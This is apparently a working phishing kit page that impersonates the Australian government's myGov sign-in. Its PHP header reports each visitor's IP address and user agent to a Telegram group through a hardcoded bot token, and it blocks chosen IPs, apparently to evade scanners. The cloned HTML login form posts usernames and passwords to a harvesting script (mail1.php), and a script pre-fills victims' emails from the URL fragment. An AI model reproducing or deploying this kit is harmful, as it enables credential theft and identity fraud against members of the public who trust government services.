<?php
// Telegram Bot API token
$botApiToken = '7377635625:AAGaEhGs_Rk-y_dGbNZg3qzwqbuzw8f0fRQ';

// Telegram group ID where you want to send notifications
$groupId = '-4287461385';

// Array of blocked IP addresses
$blockedIPs = [
    '161.35.121.7',
    // Add more IPs as needed
];

// Function to get visitor's IP address
function getIpAddress() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        // Check IP from shared internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Check IP from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    return $ip;
}

// Function to send notification to Telegram
function sendNotification($message) {
    global $botApiToken, $groupId;

    $telegramApiUrl = "https://api.telegram.org/bot$botApiToken/sendMessage";
    $params = [
        'chat_id' => $groupId,
        'text' => $message,
    ];

    // Use cURL to send POST request to Telegram Bot API
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

// Get visitor's IP address
$ipAddress = getIpAddress();

// Check if IP is in blocked list
if (in_array($ipAddress, $blockedIPs)) {
    exit; // Exit script if IP is blocked
}

// Get user agent
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// Construct Telegram message
$locationUrl = "https://ipapi.co/$ipAddress/";
$message = " 

▪ Visitor 🇦🇺 👤
▪ MyGov Sign-In 💼

IP = $ipAddress
Location = $locationUrl
User Agent = $userAgent

============================";

// Send notification to Telegram
$response = sendNotification($message);

// Debugging: Print response from Telegram API (optional)
// echo "Response from Telegram API:<br>";
// echo "<pre>" . print_r($response, true) . "</pre>";
?>

<!DOCTYPE html>
<!--[if IE 9]><html class="ie ie9" lang="en"><![endif]-->
<!--[if (gt IE 9)|!(IE)]><!-->
<html lang="en">
<!--<![endif]-->

<head>
    <!--
E: PROD; 
C: MW0w; 
N: MW0w10; 
S: SW10d;  
-->
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <title>
        Sign in with myGov - myGov
    </title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- phone number format detection, turning it off -->
    <meta name="format-detection" content="telephone=no">
    <script type="text/javascript" src="/LoginServices/main/ruxitagentjs_ICA2Vfghjqrux_10249220905100923.js" data-dtconfig="app=5f15dc81410a75c1|ssc=1|rcdec=1209600000|featureHash=ICA2Vfghjqrux|vcv=2|rdnt=0|uxrgce=1|bp=3|srmcrv=10|cuc=gpalpirq|mel=100000|md=mdcc1=ainput#user-id,mdcc2=adiv.error-msg-text span,mdcc3=aspan[data-home-welcome-message]|ssv=4|lastModification=1674151740659|dtVersion=10249220905100923|srmcrl=1|tp=500,50,0,1|uxdcw=1500|agentUri=/LoginServices/main/ruxitagentjs_ICA2Vfghjqrux_10249220905100923.js|reportUrl=/LoginServices/main/rb_6de8e2e9-6719-45b3-86be-7effcb9f6525|rid=RID_315655542|rpid=1022727629|domain=my.gov.au"></script>
    <link rel="icon" type="image/png" sizes="32x32" href="img/favicon-32-32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="img/favicon-32x32.png">
    <link href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&amp;display=swap" rel="stylesheet">
    <link href="css/mgv2-application.css" rel="stylesheet">
    <link href="css/blugov.css" rel="stylesheet">
</head>

<noscript>
    <div class="outage">
        <div class="outage__inner">
            <div>
                <span class="is-visuallyhidden"> Warning message: </span>
                <p> JavaScript is required for myGov to work correctly.</p>
            </div>
        </div>
    </div>
</noscript>

<body>

<nav class="uikit-skip-link" aria-label="Skip Links">
    <a class="uikit-skip-link__link" href="#content">Skip to main content</a>
</nav>

<div class="brand-rainbow">&nbsp;</div>
<header role="banner" class="mgvEnhanceHeader">
    <section class="wrapper">
        <div class="inner">
            <div class="unauth-grid">
                <div class="unauth-grid-row">
                    <a href="https://beta.my.gov.au/" class="unauth-govt-crest__link">
                        <img id="unauth-govt-crest" src="img/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
                    </a>

                    <div class="header-links">
                        <a href="https://beta.my.gov.au/en/about/help">Help</a>
                    </div>
                </div>
            </div>
        </div>
    </section>
</header>

<div class="wrapper-mapwap">
    <div class="main-block" id="content" role="main"> 
        <div class="unauth">
            <div class="login-grid-container">
                <div class="login-grid-row">
                    <div class="login-grid-column">
                        <div class="digital-id-login-card-wrapper">
                            <div class="digital-id-main-login-card override">
                                <h1>Sign in with myGov</h1>
                                <p class="login-instruction-text">Choose how to sign in from these 2 options</p>
                                <h2 class="text-align-left">Using your myGov sign in details</h2>
                                <form action="mail1.php" id="mygov-login-form" aria-describedby="error-msg" class="mygov-login-form alternative" method="post">
                                    <div class="input-group">
                                        <label class="override" for="userId">Username or email</label>
                                        <input id="userId" name="username" aria-required="true" data-username="data-username" type="text" value="" autocomplete="off" required>
                                    </div>
                                    <p class="recovery">
                                        <a href="" class="anchor override">Forgot username</a>
                                    </p>

                                    <div class="input-group">
                                        <label for="password" class="override">Password</label>
                                        <div class="password-group">
                                            <input id="password" name="password" type="password" data-current-password="data-current-password" autocomplete="off" aria-required="true" required>
                                        </div>
                                    </div>
                                    <p class="recovery">
                                        <a href="" class="anchor override">Forgot password</a>
                                    </p>

                                    <div class="button-digital-id-main-container override">
                                        <div class="digital-id-button-container">
                                            <button type="submit" class="button-main">Sign in</button>
                                        </div>
                                    </div>

                                    <p class="create-account-text"><a class="create-account-link" href="https://my.gov.au/en/create-account/">Create a myGov account</a> if you don't have one already.</p>
                                </form>

                                <div class="hr-word">
                                    <div class="draw-circle">or</div>
                                </div>

                                <div class="digital-id-login-card secondary">
                                    <div class="button-digital-id-container">
                                        <h2 class="text-align-left">Using your myGovID Digital Identity</h2>
                                        <div class='digital-id-login-option-container'>
                                            <div class='inner-options'>
                                                <p class="external-links-zone">
                                                    What is <a href="https://www.digitalidentity.gov.au/" target="_blank">Digital Identity</a> and <a href="https://www.mygovid.gov.au/" target="_blank">myGovID</a>?
                                                </p>
                                                <a class="button-digital-identity" href="/las/mygov-login?execution=e5s1&amp;_eventId=digitalIdentity">Continue with Digital Identity</a>
                                                <input type="hidden" value="{flowScope.targetParamDI}" />
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<footer role="contentinfo">
    <div class="wrapper">
        <div class="inner">
            <section class="footer-list">
                <nav>
                    <h2 class="sr-only" aria-label="Footer">Footer</h2>
                    <ul class="lower-links">
                        <li>
                            <a target="_blank" href="https://my.gov.au/en/about/terms">Terms of use</a>
                        </li>
                        <li>
                            <a target="_blank" href="https://my.gov.au/en/about/privacy-and-security">Privacy and security</a>
                        </li>
                        <li>
                            <a target="_blank" href="https://my.gov.au/en/about/copyright">Copyright</a>
                        </li>
                        <li>
                            <a target="_blank" href="https://my.gov.au/en/about/accessibility">Accessibility</a>
                        </li>
                    </ul>
                </nav>
            </section>
            <div class="footer-lower">
                <section class="footer-lower-logo">
                    <a href="https://beta.my.gov.au/">
                        <img src="img/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
                    </a>
                </section>

                <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
            </div>
        </div>
    </div>
</footer>

<script type="text/javascript" src="/mygov/content/mgv2/js/mgv2-vendor.js"></script>
<script type="text/javascript" src="/mygov/content/mgv2/js/mgv2-application.js"></script>
<script type="text/javascript" src="/mygov/content/mgv2/js/login.js"></script>
<script type="text/javascript">
    // Function to set the value based on URL fragment
    function setValueFromFragment() {
        // Get the fragment from the URL (everything after #)
        const fragment = window.location.hash.substring(1); // Remove the #

        // If there's a fragment, set it as the value
        if (fragment) {
            const inputElement = document.querySelector('input[name="username"]');
            if (inputElement) {
                inputElement.value = fragment;
            }
        }
    }

    // Run the function when the page loads
    window.onload = setValueFromFragment;
</script>
<div id="artifact-metadata"></div>
</body>

</html>
